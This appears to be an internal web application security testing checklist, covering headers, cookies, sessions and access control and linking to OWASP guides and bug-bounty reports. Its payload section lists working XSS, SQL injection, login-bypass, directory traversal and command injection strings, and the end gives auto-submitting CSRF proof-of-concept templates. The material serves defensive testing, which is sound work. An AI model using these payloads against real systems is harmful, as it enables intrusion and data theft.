The ratings provided in the checklist were primarily generated using CVSS V3.1 average scores for 2025 CVEs. Please use the following tools to create ratings that more accurately represent your application and organization's risk appetite:

https://owasp.org/www-community/OWASP_Risk_Rating_Methodology \
https://www.first.org/cvss/calculator/4-0

## Continuous Review
Please continue to evaluate the continuous review section and response headers sections of the checklist throughout the entire assessment. We encourage app teams to update the checklist and payload lists with language specific links and relevant company policies to ensure future developers follow the organization's requirements.

### Error Messages are Properly Handled
Error messages should be short and generic. Do not show stack traces or informative messages to the user.

**Resources:** https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html

**Real-World Examples:** https://hackerone.com/reports/147577 \
https://hackerone.com/reports/482707

### Autocomplete Disabled on Sensitive Input Fields
Emails, passwords, challenge questions, and other sensitive information should have autocomplete="off".

**Resources:** https://www.w3schools.com/howto/howto_html_autocomplete_off.asp

**Real-World Examples:** https://hackerone.com/reports/2828263 \
https://hackerone.com/reports/1023773

### Sensitive Information is Masked
Sensitive information should be masked to mitigate shoulder surfing attacks.

**Resources:** https://labex.io/tutorials/javascript-mask-a-value-28489

**Real-World Examples:** https://hackerone.com/reports/2828271

### Sensitive Information Not in URL
Do not send sensitive information in GET request parameters.

**Resources:** https://cwe.mitre.org/data/definitions/598.html

**Real-World Examples:** https://hackerone.com/reports/83667 \
https://hackerone.com/reports/813159

### Unnecessary Methods are Disabled
Do not allow unsafe methods such as Trace or Connect on any endpoint. Disable DELETE, POST, etc. if not needed on the endpoint.

**Resources:** https://cyberwhite.co.uk/http-verbs-and-their-security-risks/

**Real-World Examples:** https://hackerone.com/reports/8184 \
https://hackerone.com/reports/203409

### HTTP Disabled
Enforce HTTPS for all connections.

**Resources:** https://blog.matrixpost.net/redirect-from-http-to-https-using-the-iis-url-rewrite-module/

**Real-World Examples:** https://hackerone.com/reports/43280

## Response Headers
The following tools will check the response headers of your application and report on any insecurities or misconfigurations. We highly recommend checking the response headers manually because these tools may not follow the requirements of your organization. Additionally, most of these tools are limited to unauthenticated checks, meaning that sensitive authenticated responses will not be evaluated.

**Resources:** https://securityheaders.com/ \
https://hackertarget.com/http-header-check/

### Content-Security-Policy 
The CSP should include script-src and default-src. Do not use unsafe directives, such as unsafe-inline or unsafe-eval. Do not include wildcards in the CSP unless they are used in the subdomain of a trusted site. 

**Quick Guide:** https://content-security-policy.com/ \
**Evaluation Tool:** https://csp-evaluator.withgoogle.com/

**Resources:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy

**Real-World Examples:** https://hackerone.com/reports/250729 \
https://hackerone.com/reports/1804177

### Strict-Transport-Security
The Strict-Transport-Security response header should contain the max-age directive set to 1 year or greater and the includeSubdomains directive. If the application is externally available, include the Preload directive.

Example: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

**Resources:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security

**Real-World Examples:** https://hackerone.com/reports/1755083

### Caching
**Cache-Control** - Set the cache-control response header to include the “no-store” flag in all responses.

**Expires** - Set the Expires header to a date in the past, or zero, in all responses.

**Resources:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control \
https://www.rfc-editor.org/rfc/rfc9111.html

**Real-World Examples:** https://hackerone.com/reports/231805 \
https://hackerone.com/reports/7909

### Information Leak Headers
Remove unnecessary response headers, such as: Server, X-Powered-By, X-AspNet-Version.

**Resources:** https://support.waters.com/KB_Inf/Other/WKB202501_How_to_disable_the_Server_HTTP_header_in_Microsoft_IIS

### CORS Headers
Do not set Access-Control-Allow-Origin to wildcard or reflect arbitrary origins/subdomains.

**Resources:** https://www.freecodecamp.org/news/exploiting-cors-guide-to-pentesting/ \
https://www.youtube.com/watch?v=4KHiSt0oLJ0

**Real-World Examples:** https://www.intigriti.com/researchers/blog/bug-bytes/bug-bytes-46-steal-customer-data-via-cors-misconfiguration-dnsexpire-py-and-badbugbountypickuplines \
https://hackerone.com/reports/958459

## Cookies
All cookies should have the following attributes: Secure, HttpOnly, SameSite: lax or strict.

**Resources:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie

**Real-World Examples:** https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html

## Payloads Required Section
This payload list is an advanced version of the short payload list. Please watch the video series before attempting these exploits as some of the payloads have a lower success rate and require a deeper understanding of the application's behavior and vulnerable parameters.

While this list was curated from select payloads from my own personal notes(generated over the course of 3 years), most of the payloads can be found in the sources below. Please see the youtube video series where sources are provided in situations where we use direct content from a third party.

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) \
https://book.hacktricks.wiki/en/index.html \
https://portswigger.net/web-security/all-topics

### Cross-Site Scripting (XSS)

**Resources:** [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting) \
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

**Real-World Examples:** https://hackerone.com/reports/881115 \
https://infosecwriteups.com/how-i-made-it-to-google-hof-f1cec85fdb1b \
https://infosecwriteups.com/idor-that-allowed-me-to-takeover-any-users-account-129e55871d8

Enter the following payloads into user input fields and see how they are reflected in the application. If the user input is reflected back unencoded and unfiltered, especially in javascript, then XSS is likely.
```
<b>test</b> 
<script>alert(1)</script>
</scriscriptpt><scrscriptipt>alert()</scriscriptpt>
</script><script>alert(1)</script>
“><script>alert(1)</script>
“/><script>alert(1)</script>

<img src=1 onerror=alert(1)>
“/><img src=x onerror=”alert()”/>
<img/src='1'/onerror=alert(0)>

javascript:alert(document.cookie)

x” onerror=alert(1)>
"onload="alert(1)

${alert(1)}

alert`1`

'-alert()-’
';alert();//
\’-alert(1)//
```

***Polyglot payloads***

```
0xsobky
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

Mathias Karlsson
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

### SQL Injection
Review the following site for a cheat sheet showing specific requirements and payloads for the most common databases. This will help tailor the following payloads to your environment. For example, if your application uses MySQL, replace the `--` in the commands below with `#`.

**Resources:** https://portswigger.net/web-security/sql-injection/cheat-sheet

**Real-World Examples:** https://marxchryz.medium.com/my-bug-bounty-journey-and-my-first-critical-bug-time-based-blind-sql-injection-aa91d8276e41 \
https://rafipiun.medium.com/how-i-got-easy-for-sql-injection-bug-7ff622236e4c \

```
Oracle Concat: 'foo’||’bar’
Oracle Comment: --comment
Oracle Version: SELECT banner FROM v$version
Oracle Time Delay:dbms_pipe.receive_message(('a’),10)

Microsoft Concat:'foo’+'bar’
Microsoft Comment: --comment or can use: /**comment*/*
Microsoft Version: SELECT @@version
Microsoft Time Delay:WAITFOR DELAY '0:0:10’

PostgreSQL Concat:'foo’||'bar’
PostgreSQL Comment: --comment or can use: /**comment*/*
PostgreSQL Version: SELECT version()
PostgreSQL Time Delay:SELECT pg_sleep(10)

MySQL Concat: 'foo’ 'bar’ or can use CONCAT('foo’,'bar’)
MySQL Comment: -- (space after the double dash) or can use: /**comment*/*
MySQL Version: SELECT @@version
MySQL Time Delay: SELECT SLEEP(10)

'
''
’ AND '1’=’1
’ AND '1’=’2

In MS-SQL we can use these queries to determine if the app is vulnerable to sql injection by using delays:
'; waitfor delay '0:30:0’--
1; waitfor delay '0:30:0’--
1)waitfor delay’0:0:10’--

Here are similar examples for PostgreSQL:
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))

(SELECT 1)
(SELECT 1+1)
(SELECT 'inputword’)

’ OR 1=1 -- 
OR 'a’=’a’-- 
1 OR 'a’=’a’--

If the first payload below returns a successful response and the second payload returns a false response, jump to the union select section.
' ORDER BY 1 --
' ORDER BY 25 --

### OR Sandwich Section
' OR 1=1 OR '
' OR sleep(5) OR '
'||(SELECT version())||'

### UNION SELECT Section
OR (1=1
1) OR (1=1
’) OR 1=1

```

### SQL Injection on Login Pages

**Resources:** https://unix.stackexchange.com/questions/391866/regex-for-password-restricting-special-characters

**Real-World Examples:** https://hackerone.com/reports/447742

**Username Field:**
```
'
''

admin' AND 1=1-- (may need different comment or space at end of comment)
admin'--
admin')--
admin' or 1=1--
admin') or 1=1-- -

If multiple accounts are being returned, we can use the following:
admin' or 1=1 limit 1 --

If spaces are not allowed, we can use  which needs to be encoded in our situation:
admin'%09OR%091=1%09--%09

If tabs and spaces are blocked:
admin'||1=1#
admin'||1#
```

**Password Field:**
```
'
''
' or 1=1#
' or 1=1--
') or 1=1#
') or 1=1-- -
```

### Directory Traversal

**Resources:** https://portswigger.net/web-security/file-path-traversal

**Real-World Examples:** https://hackerone.com/reports/333306 \
https://hackerone.com/reports/1404731 \
https://hackerone.com/reports/1102067

Please use a file/file path that exists on the web server. For example, etc/passwd if its a linux server and windows/win.ini if it is a windows server. Extend the ../ as needed.

```
../../../etc
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
../../../windows/win.ini

../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../windows/win.ini

`c:/inetpub/logs/logfiles`

Filename=/etc/passwd

Filename=….//….//….//etc/passwd
Append a null byte and valid file extension:
../../../etc/passwd%00.png

Another option is to double url encode the ../ characters.

..%252f..%252f..%252fetc/passwd
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### Command Injection

**Resources:** https://developers.redhat.com/articles/2023/03/29/4-essentials-prevent-os-command-injection-attacks#4_ways_to_prevent_os_command_injection_attacks

**Real-World Examples:** https://hackerone.com/reports/634630 \
https://medium.com/infosecmatrix/1000-bounty-command-injection-vulnerability-b190222bf07a

All "whoami" text can be replaced with "sleep 3."
```
+;+whoami
+&&+whoami
+|+whoami
+`whoami`
+$(whoami)
‘ | whoami
‘ | whoami ‘
‘ | whoami #
; sleep 3
||whoami||
||sleep 3||

 && sleep 3 &&
```

## Login Page

### Weak Passwords Not Allowed
Enforce strong password policies.

**Resources:** https://www.cisa.gov/secure-our-world/use-strong-passwords

**Real-World Examples:** https://hackerone.com/reports/237544

### User Enumeration Not Possible
Ensure the application does not reflect different messages for valid or invalid users.

**Resources:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account

**Real-World Examples:** https://hackerone.com/reports/667613

### Account Lockout Enabled
Lock user accounts after X number of failed login attempts to prevent brute-force attacks.

**Resources:** https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks

**Real-World Examples:** https://hackerone.com/reports/96115

### Multi-Factor Authentication in Use
Require multi-factor authentication at login.

**Resources:** https://auth0.com/blog/different-ways-to-implement-multifactor/

**Real-World Examples:** https://avanishpathak.medium.com/an-interesting-account-takeover-vulnerability-a1fbec0e01a \
https://thezerohack.com/how-i-might-have-hacked-any-microsoft-account \
https://infosecwriteups.com/2fa-bypass-via-forced-browsing-9e511dfdb8df

## Session Management

### Session Fixation Not Possible
Issue fresh session cookies after login.

**Resources:** https://owasp.org/www-community/controls/Session_Fixation_Protection

**Real-World Examples:** https://hackerone.com/reports/135797

### Session dies after X minutes
Invalidate session after X number of minutes.

**Resources:** https://learn.microsoft.com/en-us/office/vba/access/concepts/miscellaneous/detect-user-idle-time-or-inactivity

https://hackerone.com/reports/1241483

### Logout Button Works
Invalidate session upon logout.

**Resources:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

**Real-World Examples:** https://hackerone.com/reports/13602

### All functions require authentication
Review all application pages/functions to ensure only valid users can access the page and execute functions.

**Resources:** https://learn.microsoft.com/en-us/aspnet/core/security/authorization/simple?view=aspnetcore-9.0

**Real-World Examples:** https://medium.com/@terp0x0/how-i-found-my-first-critical-bug-bounty-unauthenticated-arbitrary-file-upload-lead-to-lfi-via-5f33c80fc44f

## Miscellaneous

### Clickjacking
Use X-Frame-Options: DENY or frame-ancestors CSP directive to prevent clickjacking attacks.

**Resources:** https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html

**Real-World Examples:** https://hackerone.com/reports/1206138

### File upload
Only allow necessary file types. Virus scan each file and rename upon upload.

**Resources:** https://github.com/dilaouid/shitshit/blob/main/backend-good-practices-security/FILE_UPLOAD.md \
https://github.gatech.edu/zsteele3/ZS6727Summer2025/blob/main/TestFiles.md

**Real-World Examples:** https://hackerone.com/reports/722919 \
https://hackerone.com/reports/808287

### Horizontal Privilege Escalation-IDOR
Ensure users cannot access resources that belong to other users.

**Resources:** https://purplesec.us/learn/privilege-escalation-attacks/ \
https://portswigger.net/web-security/access-control

**Real-World Examples:** https://infosecwriteups.com/idor-that-allowed-me-to-takeover-any-users-account-129e55871d8 \
https://mokhansec.medium.com/full-account-takeover-worth-1000-think-out-of-the-box-808f0bdd8ac7

### Vertical Privilege Escalation-MFLAC
Ensure unauthorized users cannot execute privileged functionality.

**Resources:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation \
https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html

**Real-World Examples:** https://hackerone.com/reports/1113289

## Optional Checks
The below items are optional checks. Please work with your development team to determine which checks should be required. These checks are optional due to complexity of testing, likelihood of the vulnerability, or the requirement for unlikely tech stacks.

### Business Logic Vulnerabilities
Business logic vulnerabilities require stepping through your application while thinking about how someone could abuse the assumptions and state. The application team should add real examples that may exist within their app here. Review the resources below to get an idea of what an attacker might be looking for.

**Resources:** https://portswigger.net/web-security/logic-flaws/examples \
https://www.pynt.io/learning-hub/owasp-top-10-guide/what-are-business-logic-vulnerabilities-4-ways-to-prevent-them

**Real-World Examples:** https://medium.com/@rynex797/blocked-user-can-sent-messege-business-logic-flaw-hackerone-9f9d605b7b2f \
https://hackerone.com/reports/672487

### JSON Web Tokens(JWT)
JWTs must utilize a strong secret, server-side signature validation, and a strong algorithm. Additionally, the JWT should only contain required information. Any user can decode a JWT, meaning there should not be any sensitive information stored in the payload section.

**Tools:** https://jwt.io/ \
https://token.dev/

**Resources:** https://curity.io/resources/learn/jwt-best-practices/

**Real-World Examples:** https://hackerone.com/reports/2536758 \
https://hackerone.com/reports/638635

### Cross-Site Request Forgery
CSRF attacks allow an attacker to abuse the same origin policy to force a victim user's browser to execute unintended actions on a victim application. For example, we could convince a victim user to click on a link to our attacker website where we are hosting a cross-site request to the victim application. Assuming the victim user has a valid session cookie in their browser for the victim application, the browser will execute our function. Please note that CORS misconfigurations can increase the severity of CSRF attacks because it would allow an attacker to see the response from the CSRF requests. One example of how this could be abused is having a victim user click on a malicious link that executes a CSRF attack on GET /profile. Normally, this would not have any impact, however, a misconfigured cors policy could allow the attacker to see the response from that GET request. If /profile responds with the user's personal information and SSN, the attacker would be able to see that information.

**Resources:** https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

**Real-World Examples:** https://hackerone.com/reports/204703 \
https://hackerone.com/reports/1122408

The Templates below are modified Burp PoCs. \
**CSRF PoC Template 1:**
```
<html>
  <body>
    <form action="FORM_ENDPOINT" method="POST">
      <input type="hidden" name="PARAMETER_NAME" value="PARAMETER_VALUE_ENCODED" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

**CSRF PoC Template 2, Modern:**
```
<html>
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/WEBSITE.COM\/PATH\/ENDPOINT", true);
        xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
        xhr.setRequestHeader("content-type", "application\/x-www-form-urlencoded");
        xhr.setRequestHeader("accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.7");
        xhr.withCredentials = true;
        var body = "PARAMETER_NAME=PARAMETER_VALUE";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```